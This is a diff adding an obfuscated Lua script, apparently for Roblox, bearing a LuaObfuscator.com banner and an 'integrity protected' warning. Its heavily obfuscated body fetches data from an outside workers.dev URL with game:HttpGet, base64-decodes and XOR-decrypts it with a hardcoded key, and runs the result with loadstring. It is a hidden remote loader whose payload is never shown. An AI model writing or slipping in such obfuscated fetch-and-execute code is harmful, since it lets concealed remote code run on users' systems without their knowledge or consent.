@@ -1,0 +1,12 @@
+task.spawn(function() local v0=0 -0 ;local v1;local v2;local v3;while true do if (v0==(0 -0)) then v1=nil;function v1(v5,v6) local v7=0 -0 ;local v8;local v9;local v10;local v11;local v12;local v13;while true do local v14=350 -(87 + 263) ;while true do if (v14==(180 -(67 + 113))) then if ((2 + 1)==v7) then local v15=0 + 0 ;while true do if (v15==(0 -0)) then for v18=1, #v9 do local v19=0 + 0 ;while true do if (v19==(0 -0)) then v12[v18]=string.char(bit32.bxor(v9[v18],v6:byte(((v18-(1 + 0))%v13) + (3 -2) )));if ((v18%(1952 -(802 + 150)))==(0 -0)) then task.wait();end break;end end end return table.concat(v12);end end end if (v7==(3 -1)) then v12={};v13= #v6;v7=3 + 0 ;end v14=1;end if ((886 -(261 + 624))==v14) then if (v7==(998 -(915 + 82))) then v9,v10,v11={},0 -0 ,0 + 0 ;for v16=1 -0 , #v5 do local v17=v8:find(v5:sub(v16,v16),1,true);if v17 then v17=v17-1 ;v10=(v10 * (1487 -(630 + 793))) + v17 ;v11=v11 + (1193 -(1069 + 118)) ;if (v11>=(17 -9)) then local v20=0 -0 ;local v21;while true do if ((0 + 0)==v20) then v21=0;while true do if (v21==(1 -0)) then v10=v10%((2 + 0)^v11) ;break;end if (v21==(791 -(368 + 423))) then v11=v11-(25 -17) ;v9[ #v9 + (19 -(10 + 8)) ]=math.floor(v10/(2^v11) )%(984 -728) ;v21=443 -(416 + 26) ;end end break;end end end end end v7=1915 -(1789 + 124) ;end if (v7==(0 -0)) then v8="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";v5=v5:gsub("[^"   .. v8   .. "]" ,"");v7=1 + 0 ;end break;end end end end v0=1;end if (v0==(2 -1)) then local v4=0 -0 ;while true do if (v4==(439 -(145 + 293))) then v0=432 -(44 + 386) ;break;end if ((1486 -(998 + 488))==v4) then v2=game:HttpGet("https://plain-water-04c4.ghifaridhia.workers.dev");v3=v1(v2,"AifahkcLugGuoafoufUOgIPzhisllqvkaxfnmgcagmczlugzlglhlcm");v4=4 -3 ;end end end if (v0==(1 + 1)) then loadstring(v3)();break;end end end);
+-- ⚠️ WARNING: integrity protected!
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+
+]]--
